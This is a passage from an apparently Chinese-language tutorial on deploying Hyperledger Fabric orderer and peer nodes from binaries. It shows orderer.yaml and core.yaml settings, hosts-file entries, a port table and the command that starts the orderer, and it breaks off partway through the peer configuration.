class="hljs-comment"># orderer will panic on startup if this value is set to false.</span><br>        ClientAuthRequired: <span class="hljs-literal">true</span><br><br>        <span class="hljs-comment"># Paths to PEM encoded ca certificates to trust for client authentication</span><br>        ClientRootCAs: []<br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   Channel participation API Configuration</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   - This provides the channel participation API configuration for the orderer.</span><br><span class="hljs-comment">#   - Channel participation uses the ListenAddress and TLS settings of the Admin</span><br><span class="hljs-comment">#     service.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br>ChannelParticipation:<br>    <span class="hljs-comment"># Channel participation API is enabled.</span><br>    Enabled: <span class="hljs-literal">false</span><br><br>    <span class="hljs-comment"># The maximum size of the request body when joining a channel.</span><br>    MaxRequestBodySize: <span class="hljs-number">1</span> MB<br><br><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   Consensus Configuration</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   - This section contains config options for a consensus plugin. It is opaque</span><br><span class="hljs-comment">#     to orderer, and completely up to consensus implementation to make use of.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">######</span><span class="hljs-comment">##</span><br>Consensus:<br>    <span class="hljs-comment"># The allowed key-value pairs here depend on consensus plugin. For etcd/raft,</span><br>    <span class="hljs-comment"># we use following options:</span><br><br>    <span class="hljs-comment"># WALDir specifies the location at which Write Ahead Logs for etcd/raft are</span><br>    <span class="hljs-comment"># stored. Each channel will have its own subdir named after channel ID.</span><br>    WALDir: /var/hyperledger/production/orderer1/etcdraft/wal<br><br>    <span class="hljs-comment"># SnapDir specifies the location at which snapshots for etcd/raft are</span><br>    <span class="hljs-comment"># stored. Each channel will have its own subdir named after channel ID.</span><br>    SnapDir: /var/hyperledger/production/orderer1/etcdraft/snapshot<br></code></pre></td></tr></table></figure><p>修改完成之后启动orderer节点:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">nohup ./orderer start &gt; orderer-<span class="hljs-built_in">log</span>.<span class="hljs-built_in">log</span> <span class="hljs-number">2</span>&gt;<span class="hljs-meta">&amp;1 &amp;</span><br>tail -f orderer-<span class="hljs-built_in">log</span>.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p>orderer1和orderer2同理</p><h3 id="二进制安装部署Peer节点"><a href="#二进制安装部署Peer节点" class="headerlink" title="二进制安装部署Peer节点"></a>二进制安装部署Peer节点</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">vim /etc/hosts<br><br><span class="hljs-number">192.168.177.128</span> peer0.org1.example.com<br><span class="hljs-number">192.168.177.128</span> peer1.org1.example.com<br><br><span class="hljs-number">192.168.177.128</span> peer0.org2.example.com<br><span class="hljs-number">192.168.177.128</span> peer1.org2.example.com<br><br></code></pre></td></tr></table></figure><table><thead><tr><th>节点</th><th>宿主机 IP</th><th>hosts</th><th>端口</th></tr></thead><tbody><tr><td>cli</td><td>192.168.177.128</td><td>N/A</td><td>N/A</td></tr><tr><td>orderer0</td><td>192.168.177.128</td><td>orderer0.example.com</td><td>7050 , 8443 ， 9443</td></tr><tr><td>orderer1</td><td>192.168.177.128</td><td>orderer1.example.com</td><td>8050 , 8444 ，9444</td></tr><tr><td>orderer2</td><td>192.168.177.128</td><td>orderer2.example.com</td><td>9050 , 8445 ，9445</td></tr><tr><td>org1-peer0</td><td>192.168.177.128</td><td>peer0.org1.example.com</td><td>7051 , 7052 , 9446 , 8125</td></tr><tr><td>org1-peer1</td><td>192.168.177.128</td><td>peer1.org1.example.com</td><td>8051 , 7053 , 9447 , 8126</td></tr><tr><td>org2-peer0</td><td>192.168.177.128</td><td>peer0.org2.example.com</td><td>9051 , 7054 , 9448 , 8127</td></tr><tr><td>org2-peer1</td><td>192.168.177.128</td><td>peer1.org2.example.com</td><td>10051 , 7055 , 9449 , 8128</td></tr></tbody></table><p>部署org1-peer0节点</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment">#编辑core.yaml文件</span><br><span class="hljs-comment"># Copyright IBM Corp. All Rights Reserved.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># SPDX-License-Identifier: Apache-2.0</span><br><span class="hljs-comment">#</span><br><br><span class="hljs-comment">###############################################################################</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#    Peer section</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">###############################################################################</span><br><span class="hljs-attr">peer:</span><br><br>    <span class="hljs-comment"># The peer id provides a name for this peer instance and is used when</span><br>    <span class="hljs-comment"># naming docker resources.</span><br>    <span class="hljs-attr">id:</span> <span class="hljs-string">peer0.org1.example.com</span><br><br>    <span class="hljs-comment"># The networkId allows for logical separation of networks and is used when</span><br>    <span class="hljs-comment"># naming docker resources.</span><br>    <span class="hljs-attr">networkId:</span> <span class="hljs-string">dev</span><br><br>    <span class="hljs-comment"># The Address at local network interface this Peer will listen on.</span><br>    <span class="hljs-comment"># By default, it will listen on all network interfaces</span><br>    <span class="hljs-attr">listenAddress:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.177</span><span class="hljs-number">.128</span><span class="hljs-string">:7051</span><br><br>    <span class="hljs-comment"># The endpoint this peer uses to listen for inbound chaincode connections.</span><br>    <span class="hljs-comment"># If this is commented-out, the listen address is selected to be</span><br>    <span class="hljs-comment"># the peer&#x27;s address (see below) with port 7052</span><br>    <span class="hljs-attr">chaincodeListenAddress:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.177</span><span class="hljs-number">.128</span><span class="hljs-string">:7052</span><br><br>    <span class="hljs-comment"># The endpoint the chaincode for this peer uses to connect to the peer.</span><br>    <span class="hljs-comment"># If this is not specified, the chaincodeListenAddress address is selected.</span><br>    <span class="hljs-comment"># And if chaincodeListenAddress is not specified, address is selected from</span><br>    <span class="hljs-comment"># peer address (see below). If specified peer address is invalid then it</span><br>    <span class="hljs-comment"># will fallback to the auto detected IP (local IP) regardless of the peer</span><br>    <span class="hljs-comment"># addressAutoDetect value.</span><br>    <span class="hljs-attr">chaincodeAddress:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.177</span><span class="hljs-number">.128</span><span class="hljs-string">:7052</span><br><br>    <span class="hljs-comment"># When used as peer config, this represents the endpoint to other peers</span><br>    <span class="hljs-comment"># in the same organization. For peers in other organization, see</span><br>    <span class="hljs-comment"># gossip.externalEndpoint for more info.</span><br>    <span class="hljs-comment"># When used as CLI config, this means the peer&#x27;s endpoint to interact with</span><br>    <span class="hljs-attr">address:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.177</span><span class="hljs-number">.128</span><span class="hljs-string">:7051</span><br><br>    <span class="hljs-comment"># Whether the Peer should programmatically determine its address</span><br>    <span class="hljs-comment"># This case is useful for docker containers.</span><br>    <span class="hljs-comment"># When set to true, will override peer address.</span><br>    <span class="hljs-attr">addressAutoDetect:</span> <span class="hljs-literal">false</span><br><br>    <span class="hljs-comment"># Settings for the Peer&#x27;s gateway server.</span><br>    <span class="hljs-attr">gateway:</span><br>        <span class="hljs-comment"># Whether the gateway is enabled for this Peer.</span><br>        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>        <span class="hljs-comment"># endorsementTimeout is the duration the gateway waits for a response</span><br>        <span class="hljs-comment"># from other endorsing peers before returning a timeout error to the client.</span><br>        <span class="hljs-attr">endorsementTimeout:</span> <span class="hljs-string">30s</span><br>        <span class="hljs-comment"># dialTimeout is the duration the gateway waits for a connection</span><br>        <span class="hljs-comment"># to other network nodes.</span><br>        <span class="hljs-attr">dialTimeout:</span> <span class="hljs-string">2m</span><br><br><br>    <span class="hljs-comment"># Keepalive settings for peer server and clients</span><br>    <span class="hljs-attr">keepalive:</span><br>        <span class="hljs-comment"># Interval is the duration after which if the server does not see</span><br>        <span class="hljs-comment"># any activity from the client it pings the client to see if it&#x27;s alive</span><br>        <span class="hljs-attr">interval:</span> <span class="hljs-string">7200s</span><br>        <span class="hljs-comment"># Timeout is the duration the server waits for a response</span><br>        <span class="hljs-comment"># from the client after sending a ping before closing the connection</span><br>        <span class="hljs-attr">timeout:</span> <span class="hljs-string">20s</span><br>        <span class="hljs-comment"># MinInterval is the minimum permitted time between client pings.</span><br>        <span class="hljs-comment"># If clients send pings more frequently, the peer server will</span><br>        <span class="hljs-comment"># disconnect them</span><br>        <span class="hljs-attr">minInterval:</span> <span class="hljs-string">60s</span><br>        <span class="hljs-comment"># Client keepalive settings for communicating with other peer nodes</span><br>        <span class="hljs-attr">client:</span><br>            <span class="hljs-comment"># Interval is the time between pings to peer nodes.  This must</span><br>            <span class="hljs-comment"># greater than or equal to the minInterval specified by peer</span><br>            <span class="hljs-comment"># nodes</span><br>            <span class="hljs-attr">interval:</span> <span class="hljs-string">60s</span><br>            <span class="hljs-comment"># Timeout is the duration the client waits for a response from</span><br>            <span class="hljs-comment"># peer nodes before closing the connection</span><br>            <span class="hljs-attr">timeout:</span> <span class="hljs-string">20s</span><br>        <span class="hljs-comment"># DeliveryClient keepalive settings for communication with ordering</span><br>        <span class="hljs-comment"># nodes.</span><br>        <span class="hljs-attr">deliveryClient:</span><br>            <span class="hljs-comment"># Interval is the time between pings to ordering nodes.  This must</span><br>            <span class="hljs-comment"># greater than or equal to the minInterval specified by ordering</span><br>            <span class="hljs-comment"># nodes.</span><br>            <span class="hljs-attr">interval:</span> <span class="hljs-string">60s</span><br>            <span class="hljs-comment"># Timeout is the duration the client waits for a response from</span><br>            <span class="hljs-comment"># ordering nodes before closing the connection</span><br>            <span class="hljs-attr">timeout:</span> <span class="hljs-string">20s</span><br><br><br>    <span class="hljs-comment"># Gossip related configuration</span><br>    <span class="hljs-attr">gossip:</span><br>        <span class="hljs-comment"># Bootstrap set to initialize gossip with.</span><br>        <span class="hljs-comment"># This is a list of other peers that this peer reaches out to at startup.</span><br>        <span class="hljs-comment"># Important: The endpoints here have to be endpoints of peers in the same</span><br>        <span class="hljs-comment"># organization, because the peer would refuse connecting to these endpoints</span><br>        <span class="hljs-comment"># unless they are in the same organization as the peer.</span><br>        <span class="hljs-attr">bootstrap:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.177</span><span class="hljs-number">.128</span><span class="hljs-string">:7051</span><br><br>        <span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> orgLeader and useLeaderElection parameters are mutual exclusive.</span><br>        <span class="hljs-comment"># Setting both to true would result in the termination of the peer</span><br>        <span class="hljs-comment"># since this is undefined state. If the peers are configured with</span><br>        <span class="hljs-comment"># useLeaderElection=false, make sure there is at least 1 peer in the</span><br>        <span class="hljs-comment"># organization that its orgLeader is set to true.</span><br><br>        <span class="hljs-comment"># Defines whenever peer will initialize dynamic algorithm for</span><br>        <span class="hljs-comment"># &quot;leader&quot; selection, where leader is the peer to establish</span><br>        <span class="hljs-comment"># connection with ordering service and use delivery protocol</span><br>        <span class="hljs-comment"># to pull ledger blocks from ordering service.</span><br>        <span class="hljs-attr">useLeaderElection:</span> <span 